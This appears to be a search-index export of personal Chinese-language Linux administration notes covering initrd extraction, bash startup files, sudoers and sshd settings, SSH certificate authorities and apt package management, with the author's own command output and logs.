\u901a\u5e38\u662f\u4e00\u4e2a\u538b\u7f29\u540e\u7684 cpio archive\u3002</p> <ul> <li>\u5148\u7528 file \u67e5\u770b\u6587\u4ef6\u7c7b\u578b\uff0c\u7136\u540e\u89e3\u538b\uff0c\u518d\u8f93\u5165\u7ed9 cpio \u63d0\u53d6<ul> <li>unzstd -c \u8868\u793a\u89e3\u538b\u5230\u6807\u51c6\u8f93\u51fa</li> <li>cpio -D \u89e3\u538b\u5230\u6307\u5b9a\u8def\u5f84 <pre><code>root@ryzen-pve \u279c  ~ file /boot/initrd.img-6.8.12-2-pve\n/boot/initrd.img-6.8.12-2-pve: Zstandard compressed data (v0.8+), Dictionary ID: None\n\nunzstd -c /boot/initrd.img-6.8.12-2-pve | cpio -idmv -D /mnt/initrd\n</code></pre></li> </ul> </li> </ul> <ul> <li><code>gzip compressed data</code></li> <li><code>XZ compressed data</code></li> <li><code>LZMA compressed data</code></li> <li><code>ASCII cpio archive</code> (This is rare for modern initrds) <pre><code>gunzip -c  # \u6216 zcat\nxzcat\nlzma -d -c\n</code></pre></li> </ul>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#bash-\u914d\u7f6e","title":"bash \u914d\u7f6e","text":"<p>1. \u767b\u5f55 Shell (Login Shell)</p> <p>\u767b\u5f55 shell \u7684\u52a0\u8f7d\u987a\u5e8f\u5982\u4e0b\uff1a</p> <ol> <li>/etc/profile\uff1a\u7cfb\u7edf\u7ea7\u7684\u5168\u5c40\u914d\u7f6e\u6587\u4ef6\uff0c\u5bf9\u6240\u6709\u7528\u6237\u751f\u6548\u3002\u901a\u5e38\u5305\u542b\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u7684\u8bbe\u7f6e\u3001\u542f\u52a8\u7a0b\u5e8f\u7684\u811a\u672c\u7b49\u3002</li> <li>/etc/profile.d/*.sh\uff1a<code>/etc/profile.d</code> \u76ee\u5f55\u4e0b\u7684\u6240\u6709 <code>.sh</code> \u6587\u4ef6\uff0c\u4e5f\u662f\u7cfb\u7edf\u7ea7\u7684\u5168\u5c40\u914d\u7f6e\uff0c\u65b9\u4fbf\u7ba1\u7406\u5458\u6dfb\u52a0\u81ea\u5b9a\u4e49\u7684\u914d\u7f6e\u811a\u672c\u3002</li> <li>~/.bash_profile\uff1a\u7528\u6237\u7684\u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6\uff0c\u4ec5\u5bf9\u5f53\u524d\u7528\u6237\u751f\u6548\u3002\u5982\u679c\u8be5\u6587\u4ef6\u5b58\u5728\uff0c\u5219\u6267\u884c\u8be5\u6587\u4ef6\uff0c\u540e\u9762\u7684\u6587\u4ef6\u4e0d\u518d\u6267\u884c\u3002</li> <li>~/.bash_login\uff1a\u5982\u679c <code>~/.bash_profile</code> \u4e0d\u5b58\u5728\uff0c\u5219\u6267\u884c\u8be5\u6587\u4ef6\u3002</li> <li>~/.profile\uff1a\u5982\u679c <code>~/.bash_profile</code> \u548c <code>~/.bash_login</code> \u90fd\u4e0d\u5b58\u5728\uff0c\u5219\u6267\u884c\u8be5\u6587\u4ef6\u3002</li> <li>~/.bash_logout\uff1a\u5728\u9000\u51fa\u767b\u5f55 shell \u65f6\u6267\u884c\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u6267\u884c\u4e00\u4e9b\u6e05\u7406\u5de5\u4f5c\u3002</li> </ol> <p>\u975e\u767b\u5f55 shell \u7684\u52a0\u8f7d\u987a\u5e8f\u8f83\u4e3a\u7b80\u5355\uff1a</p> <ol> <li>/etc/bashrc\uff1a\u7cfb\u7edf\u7ea7\u7684\u5168\u5c40\u914d\u7f6e\u6587\u4ef6\uff0c\u5bf9\u6240\u6709\u975e\u767b\u5f55 shell \u751f\u6548\u3002</li> <li>~/.bashrc\uff1a\u7528\u6237\u7684\u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6\uff0c\u4ec5\u5bf9\u5f53\u524d\u7528\u6237\u7684\u975e\u767b\u5f55 shell \u751f\u6548\u3002</li> </ol>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#sudoer-\u8bbe\u7f6e","title":"sudoer \u8bbe\u7f6e","text":"<pre><code>vim /etc/sudoers\n</code></pre> <p>\u5c06\u7528\u6237\u6dfb\u52a0\u5230 admin \u6216 sudo \u7528\u6237\u7ec4\u5373\u53ef</p> <p>\u514d\u5bc6\u7801\uff1a</p> <pre><code>%sudo   ALL=(ALL:ALL) NOPASSWD: ALL\n</code></pre> <p>sudoers \u6bcf\u9879\u542b\u4e49\uff08\u5f85\u7eed\uff09</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#sshd-\u8bbe\u7f6e","title":"sshd \u8bbe\u7f6e","text":"<p>\u5141\u8bb8 ssh \u767b\u5f55 root</p> <p>\u5148\u6539\u4e3a yes\uff0c\u7136\u540e ssh-copy-id \u540e\uff0c\u6539\u4e3a\u7981\u7528\u5bc6\u7801</p> <pre><code>PermitRootLogin prohibit-password\n#PermitRootLogin yes\n</code></pre> <p>\u7981\u7528\u5bc6\u7801\u767b\u5f55</p> <pre><code>PasswordAuthentication no\n</code></pre> <p>\u5176\u5b83\u9009\u9879</p> <pre><code>PermitRootLogin prohibit-password\nPubkeyAuthentication yes    # \u5141\u8bb8\u516c\u94a5\u767b\u5f55\nPubkeyAcceptedKeyTypes=+ssh-rsa\nPasswordAuthentication no   # \u7981\u7528\u5bc6\u7801\u767b\u5f55\nChallengeResponseAuthentication no\n</code></pre> <pre><code>Accepted password for yfy from 192.168.36.215 port 50342 ssh2\n\nAccepted publickey for yfy from 192.168.36.180 port 26464 ssh2: RSA SHA256:z9yheNzateaIikTVkTXN1lmMPRIsp+H0ssbhU4Q8Kfg\npam_unix(sshd:session): session opened for user yfy(uid=1000) by (uid=0)\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#setcap","title":"setcap","text":"<p>\u6388\u4e88\u7279\u5b9a\u4e8c\u8fdb\u5236\u6587\u4ef6\u5728\u4e0d\u63d0\u5347\u7528\u6237\u6743\u9650\u7684\u60c5\u51b5\u4e0b\u7ed1\u5b9a\u4f4e\u7aef\u53e3</p> <pre><code>sudo setcap 'cap_net_bind_service=+ep' /usr/bin/python3.10 # \u4e0d\u80fd\u662f\u8f6f\u94fe\u63a5\n</code></pre> <pre><code>\u279c  ~ sudo setcap cap_sys_admin+p $(readlink -f $(which sunshine))\n\n\u279c  ~ echo $(readlink -f $(which sunshine))\n/usr/bin/sunshine-v0.23.1\n\n\u279c  ~ getcap /usr/bin/sunshine-v0.23.1\n/usr/bin/sunshine-v0.23.1 cap_sys_admin=p\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#ldap","title":"ldap","text":"<p>LDAP - ACSA Docs (acsalab.com)</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#systemd","title":"systemd","text":"<pre><code>sudo systemctl list-units --type=service --state=running\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#ssh-\u8bc1\u4e66","title":"ssh \u8bc1\u4e66","text":"<p>SSH Certificate Authority - LUG @ USTC (ustclug.org) Managing servers with OpenSSH Certificate Authority - iBug</p> <ul> <li>client \u9a8c\u8bc1 server \u8eab\u4efd\uff0c\u9700\u8981\u5c06 server \u516c\u94a5\u6dfb\u52a0\u5230 known_hosts \u4e2d\u3002<ul> <li>\u5f53\u6709\u591a\u4e2a\u670d\u52a1\u5668\u65f6\uff0cclient \u9700\u8981\u540c\u610f\u591a\u6b21\uff08ssh \u65f6\u7684 yes\uff09</li> <li>\u5f53 server \u516c\u94a5\u53d8\u66f4\u65f6\uff0c\u8fd8\u5f97\u4fee\u6539 known_hosts</li> </ul> </li> <li>server \u9a8c\u8bc1 client \u8eab\u4efd\uff0c\u540c\u6837\u9700\u8981\u5c06 client public key \u6dfb\u52a0\u5230 authorized_keys \u4e2d\u3002<ul> <li>\u591a\u4e2a\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\uff0c\u9700\u8981\u5c06\u6bcf\u4e2a client \u516c\u94a5\u590d\u5236\u5230\u6bcf\u4e2a server\u3002</li> <li>\u4fee\u6539\u4e00\u4e2a client \u9700\u8981\u4fee\u6539\u6240\u6709 server</li> </ul> </li> </ul> <p>SSH CA(Certificate Authority) \u662f\u4e00\u5bf9\u53d7\u4fe1\u4efb\u7684\u5bc6\u94a5\uff0c\u7528\u4e8e\u7b7e\u53d1\u8bc1\u4e66\u3002</p> <p>An SSH Certificate Authority (CA) is a trusted key pair that issues certificates.</p> <p>\u7b7e\u53d1\u7684\u8bc1\u4e66\u53ef\u4ee5\u7528\u6765\u6388\u6743 client \u6216\u8005 server\u3002\uff08\u901a\u8fc7\u4fe1\u4efb host CA\uff0cclient \u53ef\u4ee5\u4fe1\u4efb\u6240\u6709 server\uff0c\u53ea\u8981\u5b83\u4eec\u6709 host CA \u7b7e\u540d\u7684\u8bc1\u4e66\u3002\u540c\u6837\uff0c\u901a\u8fc7\u4fe1\u4efb user CA\uff0cserver \u53ef\u4ee5\u4fe1\u4efb\u6240\u6709\u7684 client\uff0c\u53ea\u8981\u5b83\u4eec\u6709 user CA \u7b7e\u540d\u7684\u8bc1\u4e66\u3002\uff09</p> <p>Certificates can be used for authentication on both the server side and the client side</p> <p>SSH CA \u548c X.509 \u8bc1\u4e66\u7cfb\u7edf\u4e0d\u540c\u7684\u662f\uff0c\u8bc1\u4e66\u65e0\u6cd5\u7b7e\u53d1\u65b0\u7684\u8bc1\u4e66\uff08\u5373\u65e0\u6cd5\u5d4c\u5957\uff09</p> <p>host CA \u548c user CA \u53ef\u4ee5\u662f\u4e0d\u540c\u7684\uff0c\u4e5f\u53ef\u4ee5\u662f\u76f8\u540c\u7684\u3002 </p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#ssh-ca","title":"SSH CA","text":"","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u521b\u5efa-ca","title":"\u521b\u5efa CA","text":"<p>\u548c\u521b\u5efa\u4e00\u4e2a\u901a\u5e38\u7684\u5bc6\u94a5\u5bf9\u4e00\u6837\u3002</p> <pre><code> sudo ssh-keygen -f yfy_ca -t ed25519 -C \"yfy CA\"\n</code></pre> <ul> <li>-t dsa | ecdsa | ecdsa-sk | ed25519 | ed25519-sk | rsa</li> <li>-C comment\uff1a\u6dfb\u52a0\u5230\u516c\u94a5\u7ed3\u5c3e</li> </ul>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u7b7e\u53d1\u8bc1\u4e66","title":"\u7b7e\u53d1\u8bc1\u4e66","text":"<pre><code>ssh-keygen -s /path/to/ssh_ca \\\n           -I certificate_identity \\\n           -n principals \\\n          [-O options] \\\n          [-V validity_interval] \\\n           public_key_file\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u4f7f\u7528-host-ca-\u6388\u6743-server-\u7aef","title":"\u4f7f\u7528 host CA \u6388\u6743 server \u7aef","text":"<p>\u7ed9 server \u7684\u516c\u94a5 ssh_host_rsa_key.pub \u7b7e\u540d</p> <pre><code>ssh-keygen -s /path/to/ssh_ca \\\n           -I blog \\\n           -h \\\n           -n blog.s.ustclug.org,blog.p.ustclug.org,10.254.0.15,202.141.176.98,202.141.160.98 \\\n           ssh_host_rsa_key.pub\n</code></pre> <ul> <li>-h \u8868\u793a\u7b7e\u53d1\u7684\u662f host \u8bc1\u4e66\uff08server \u7aef\uff09</li> <li>-n \u7528\u4e8e\u9650\u5236\u8be5\u8bc1\u4e66\u53ea\u5728\u63d0\u4f9b\u7684\u57df\u540d\u6216\u8005 ip \u4e0a\u6709\u6548\u3002\u8fd9\u6837\u5373\u4f7f\u8be5\u8bc1\u4e66\u88ab\u5077\u4e86\uff0c\u5077\u7a83\u8005\u4e5f\u65e0\u6cd5\u4f2a\u9020\u6211\u4eec\u7684\u670d\u52a1\u5668\u3002</li> </ul> <p>\u6dfb\u52a0\u5230 sshd \u914d\u7f6e\u4e2d\uff0c\u8fd9\u6837 client \u8fde\u63a5\u65f6\u4f1a\u5c1d\u8bd5\u63d0\u4f9b\u8be5\u8bc1\u4e66</p> <pre><code># /etc/ssh/sshd_config\nHostCertificate /etc/ssh/ssh_host_rsa_key-cert.pub\n</code></pre> <p>\u5ba2\u6237\u7aef\u4fe1\u4efb CA \u673a\u6784</p> <ul> <li>\u5c06 CA \u516c\u94a5\u4fdd\u5b58\u5728 my_ca.pub \u4e2d</li> </ul> <pre><code>printf \"@cert-authority * \" | cat - my_ca.pub &gt;&gt; ~/.ssh/known_hosts\n</code></pre> <ul> <li>\u4fdd\u5b58\u5728 dns \u4e2d<ul> <li>\u5229\u7528{command1 &amp;&amp; command2 }\u5c06\u4e24\u6761\u547d\u4ee4\u5408\u5e76\uff0c\u5c06\u5176\u8f93\u51fa\u91cd\u5b9a\u5411</li> </ul> </li> </ul> <pre><code>{printf \"@cert-authority * \" &amp;&amp; dig ca.yfycloud.top TXT +noall +answer | awk -F'TXT' '{print $NF}' |xargs} &gt;&gt; ~/.ssh/known_hosts\n</code></pre> <p>\u4f7f\u7528 nslookup(windows bash \u4e0b\u6d4b\u8bd5)</p> <pre><code>(printf \"@cert-authority * \" &amp;&amp; nslookup -q=txt ca.yfycloud.top |grep CA | xargs) &gt;&gt; ~/.ssh/known_hosts\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u4f7f\u7528-user-ca-\u6388\u6743-client-\u7aef","title":"\u4f7f\u7528 user CA \u6388\u6743 client \u7aef","text":"<p>\u670d\u52a1\u7aef\u4fe1\u4efb user CA</p> <pre><code>TrustedUserCAKeys /etc/ssh/ssh_user_ca\n</code></pre> <p>\u7ed9\u6307\u5b9a\u7528\u6237\u7b7e\u53d1\u8bc1\u4e66</p> <pre><code>ssh-keygen -s my_ca -I &lt;user name&gt; -n root,ubuntu id_rsa.pub\n</code></pre> <ul> <li>\u5c06\u751f\u6210\u7684 id_rsa-cert.pub \u653e\u81f3 id_rsa.pub \u540c\u4e00\u76ee\u5f55\uff0cssh \u8fde\u63a5\u670d\u52a1\u7aef\u65f6\u4f1a\u81ea\u52a8\u8bfb\u53d6\u3002</li> <li>-n \u7528\u4e8e\u9650\u5236\u5141\u8bb8\u767b\u5f55\u7684\u7528\u6237</li> </ul>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u9047\u5230\u95ee\u9898","title":"\u9047\u5230\u95ee\u9898","text":"<p>mobaxterm\u8fde\u63a5\u670d\u52a1\u5668\u65f6\u62a5\u9519\uff1a<code>No supported authentication methods available (server sent: publickey)</code> \u4f46\u662f\u6211\u660e\u660e\u662f\u6307\u5b9a\u7684\u4f7f\u7528ssh key\u767b\u5f55\uff0c\u5728\u547d\u4ee4\u884c\u4e2d\u4e5f\u786e\u5b9e\u662f\u80fd\u591f\u7528\u6307\u5b9a\u7684\u79c1\u94a5\u767b\u5f55\u7684\u3002</p> <p>\u540e\u9762\u53d1\u73b0\u95ee\u9898\u662fmobaxterm\u53d1\u73b0\u4e86\u6211\u6709\u4e00\u4e2a\u8bc1\u4e66\uff0c\u4f7f\u7528\u8be5\u8bc1\u4e66\u53bb\u767b\u5f55\u4e86\u3002\u4f46\u662f\u8be5\u8bc1\u4e66\u7b7e\u540d\u65f6\u53eaprincipal\u53ea\u6307\u5b9a\u4e86root\uff0c\u4ece\u800c\u5bfc\u81f4\u767b\u4e0d\u4e0a\u3002 \u670d\u52a1\u7aef\u65e5\u5fd7\u5982\u4e0b\uff0c\u521a\u5f00\u59cb\u6307\u5b9a\u767b\u5f55root\u6210\u529f\uff0c\u7b2c\u4e8c\u6b21\u6307\u5b9afyyuan\u767b\u5f55\u5931\u8d25</p> <pre><code>Mar 29 11:39:26 snode1 sshd[1143073]: Accepted publickey for root from 2001:da8:d800:c017:ed94:1e42:a843:27f9 port 23902 ssh2: ED25519-CERT SHA256:oL5HVEHu4AQj4e0d03kjT39A6p5t+3j5SKUKOqLKjwI ID Yuan Fuyan (serial 0) CA ECDSA SHA256:e/hc4wrIaub3Q8UGmQYQI3A2fiiHF/RevFKo0UCG4Tc\nMar 29 11:39:26 snode1 sshd[1143073]: pam_unix(sshd:session): session opened for user root by (uid=0)\nMar 29 11:39:45 snode1 sshd[1144083]: error: Certificate invalid: name is not a listed principal\nMar 29 11:39:45 snode1 sshd[1144083]: error: Received disconnect from 2001:da8:d800:c017:ed94:1e42:a843:27f9 port 23929:14: No supported authentication methods available [preauth]\nMar 29 11:39:45 snode1 sshd[1144083]: Disconnected from authenticating user fyyuan 2001:da8:d800:c017:ed94:1e42:a843:27f9 port 23929 [preauth]\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u5305\u7ba1\u7406\u5668-apt","title":"\u5305\u7ba1\u7406\u5668 apt","text":"<pre><code>apt show pkg -a #\u67e5\u770b\u5305\u7684\u6240\u6709\u4ed3\u5e93  # APT-Sources:\n</code></pre> <pre><code>--no-install-recommends\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#sourcelist","title":"source.list","text":"<pre><code>deb [ option1=value1 option2=value2 ] uri suite [component1] [component2] [...]\n</code></pre> <p>ONE-LINE-STYLE FORMAT</p> <p>If options should be provided they are separated by spaces and all of them together are enclosed by square brackets ([]) included in the line after the type separated from it with a space. If an option allows multiple values these are separated from each other with a comma (,). An option name is separated from its value(s) by an equals sign (=). Multivalue options also have -= and += as separators, which instead of replacing the default with the given value(s) modify the default value(s) to remove or include the given values.</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u67e5\u8be2\u6587\u4ef6","title":"\u67e5\u8be2\u6587\u4ef6","text":"<p>linux - List of files installed from apt package - Server Fault</p> <pre><code>apt install apt-file\napt-file update\n</code></pre> <p>\u5217\u51fa\u5305\u7684\u5185\u5bb9</p> <ul> <li>\u5df2\u5b89\u88dd\u5305\uff1a<code>dpkg -L deb</code></li> <li>\u672a\u5b89\u88dd\u5305\uff1a<code>apt-file list $package</code></li> <li>\u6709 deb \u6587\u4ef6\uff1a<code>dpkg --contents $package.deb</code></li> </ul> <p>\u67e5\u8be2\u6587\u4ef6\u4f4d\u4e8e\u54ea\u4e2a\u5305\u4e2d</p> <pre><code>dpkg -S /usr/bin/nvidia-xconfig\napt-file search /usr/bin/nvidia-xconfig\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u6e90\u4f18\u5148\u7ea7","title":"\u6e90\u4f18\u5148\u7ea7","text":"<pre><code>apt-cache policy &lt;package&gt;\n</code></pre> <p>\u6309\u7167 nvidia \u5b98\u7f51\u4e0b\u8f7d\u4e86\u672c\u5730\u7248\u672c\u7684 cuda deb\uff0c\u5b89\u88c5\u540e\u5728<code>/var/cuda-repo-ubuntu2004-12-1-local</code>\u53ef\u4ee5\u770b\u5230 deb \u5305\u3002\u4f46\u662f apt install \u65f6\u4ecd\u7136\u91c7\u7528\u4e86 nvidia \u4ed3\u5e93\u7684\u3002</p> <p>\u89e3\u51b3\u65b9\u6cd5\uff1a</p> <ul> <li>\u76f4\u63a5\u6ce8\u91ca\u6389<code>/etc/apt/source.list</code>\u4e2d\u7684 nvidia \u4ed3\u5e93\uff0c\u7136\u540e apt update<ul> <li>\u4e5f\u6709\u53ef\u80fd source.list \u4e2d\u6ca1\u6709 developer.download.nvidia.com\uff0c\u90a3\u4e48\u7981\u7528<code>/etc/apt/source.list.d/</code>\u4e0b\u7684\u5728\u7ebf cuda \u4ed3\u5e93\u3002\u5982   <code>mv cuda-ubuntu2004-x86_64.list cuda-ubuntu2004-x86_64.list.bak</code>\u3002</li> </ul> </li> </ul> <pre><code>vim /etc/apt/preference.d/cuda-repository-pin-600\n\n# Priority \u8d8a\u5c0f\u4f18\u5148\u7ea7\u8d8a\u9ad8\nPackage: nsight-compute\nPin: origin *ubuntu.com*\nPin-Priority: -1\n\nPackage: nsight-systems\nPin: origin *ubuntu.com*\nPin-Priority: -1\n\nPackage: *\nPin: release l=NVIDIA CUDA\nPin-Priority: 600\n</code></pre> <pre><code>\u279c  ~ apt-cache policy gnome-shell-extension-ubuntu-dock\ngnome-shell-extension-ubuntu-dock:\n  Installed: (none)\n  Candidate: 72~ubuntu5.22.04.2.1\n  Version table:\n     72~ubuntu5.22.04.2.1 500\n        500 http://mirrors.ustc.edu.cn/ubuntu jammy-updates/main amd64 Packages\n     72~ubuntu5 500\n        500 http://mirrors.ustc.edu.cn/ubuntu jammy/main amd64 Packages\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#deb-\u5305\u4e0e\u8f6f\u4ef6\u6e90","title":"deb \u5305\u4e0e\u8f6f\u4ef6\u6e90","text":"<ul> <li>deb \u5305\u662f ar \u6587\u4ef6\uff08\u4e0d\u652f\u6301\u76ee\u5f55\uff0car \u683c\u5f0f\u540c\u6837\u7528\u4e8e\u9759\u6001\u94fe\u63a5\u5e93\uff09</li> <li>\u5305\u542b     -  <code>debian-binary</code>\uff1a\u4ec5\u5305\u542b deb \u7248\u672c\u53f7\u7684\u6587\u672c\u6587\u4ef6\uff0c\u76ee\u524d\u7248\u672c\u4e3a\u00a0<code>2.0</code>\u3002     - <code>control.tar.xz</code>\uff08\u6216\u00a0<code>control.tar.zst</code>\u00a0\uff09         - control\uff1a\u5305\u542b\u8f6f\u4ef6\u5305\u7684\u5143\u6570\u636e\uff0c\u4f8b\u5982\u7248\u672c\uff0c\u67b6\u6784\uff0c\u7ef4\u62a4\u8005\uff0c\u4f9d\u8d56\u3001\u63cf\u8ff0\u7b49         - md5sum\uff1adata.tar.xz \u5185\u5bb9\u7684 md5sum     - <code>data.tar.xz</code>\uff08\u6216\u00a0<code>data.tar.zst</code>\u00a0\u7b49\uff09\uff1a\u5305\u542b\u8f6f\u4ef6\u5305\u7684\u5b9e\u9645\u6587\u4ef6\u3002</li> </ul> <p>\u8f6f\u4ef6\u6e90\u76ee\u5f55\u7ed3\u6784\uff1a</p> <p>\u6700\u7b80\u5355\u7684\u9700\u8981\u5305\u542b\u4ee5\u4e0b\u90e8\u5206\uff1a</p> <ul> <li>deb \u5305</li> <li><code>Packages</code>\uff1a\u5c06\u6240\u6709\u5305\u7684\u00a0<code>control</code>\u00a0\u6587\u4ef6\u8fde\u63a5\u8d77\u6765     - \u751f\u6210\uff1adpkg-scanpackages . &gt; Packages</li> <li><code>Release</code>\uff1a\u8f6f\u4ef6\u6e90\u7684\u5143\u6570\u636e\uff0c\u5305\u542b\u4e86\u751f\u6210\u65f6\u95f4\u3001Label\uff0cOrigin\uff08\u57df\u540d\uff09\uff0cPackages\u548c\u81ea\u8eab\u6587\u4ef6\uff08\u5934\u90e8\uff09\u7684\u54c8\u5e0c\uff08md5, sha1\u7b49\u7b49\uff09     - \u4f7f\u7528\u00a0<code>apt-ftparchive</code>\u00a0\u751f\u6210</li> </ul> <p>Debian \u6216 Ubuntu \u5b98\u65b9\u6e90 \u66f4\u590d\u6742\uff0c\u4ed3\u5e93\u7684\u5143\u6570\u636e\u4f1a\u5b58\u50a8\u5728\u00a0<code>dists</code>\u00a0\u76ee\u5f55\u4e0b\uff0c\u800c\u8f6f\u4ef6\u5305\u5219\u5b58\u50a8\u5728\u00a0<code>pool</code>\u00a0\u76ee\u5f55\u4e0b</p> <ul> <li><code>Release.gpg</code>\uff1a<code>Release</code>\u00a0\u6587\u4ef6\u7684 GPG \u7b7e\u540d\u3002</li> <li><code>InRelease</code>\uff1a\u9644\u52a0\u4e86 GPG \u7b7e\u540d\u7684\u00a0<code>Release</code>\u00a0\u6587\u4ef6\u3002</li> <li><code>contrib/</code>,\u00a0<code>main/</code>,\u00a0<code>non-free/</code>,\u00a0<code>non-free-firmware/</code> \u662f\u4e0d\u540c\u7684\u7ec4\u4ef6\uff08Components\uff09</li> </ul>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u5220\u9664-i386","title":"\u5220\u9664 i386","text":"<ul> <li>i386 \u53ef\u4ee5\u653e\u5fc3\u5220</li> <li>apt \u5220\u9664\u4f1a\u56e0\u4e3a\u5220\u9664 libc:i386 \u7b49\u5305\u800c\u62a5\u9519\uff0c\u4f7f\u7528 dpkg --force-all</li> </ul> <pre><code>sudo dpkg --force-all --purge $(dpkg --list | grep 'i386' | awk '{print $2}')\n</code></pre> <p>\u5220\u9664\u5b8c\u540e\uff0c\u53ef\u80fd\u6709\u4e00\u4e9b x86 \u7684\u5305\u4f1a\u4f9d\u8d56 i386 \u7684\u5305\uff0c\u4e5f\u8981\u5220\u9664 <pre><code>base) fyyuan@snode2 \u279c  ~ sudo dpkg --force-all --purge $(dpkg --list | grep 'i386' | awk '{print $2}')\ndpkg: warning: overriding problem because --force enabled:\ndpkg: warning: this is a protected package; it should not be removed\ndpkg: warning: overriding problem because --force enabled:\ndpkg: warning: 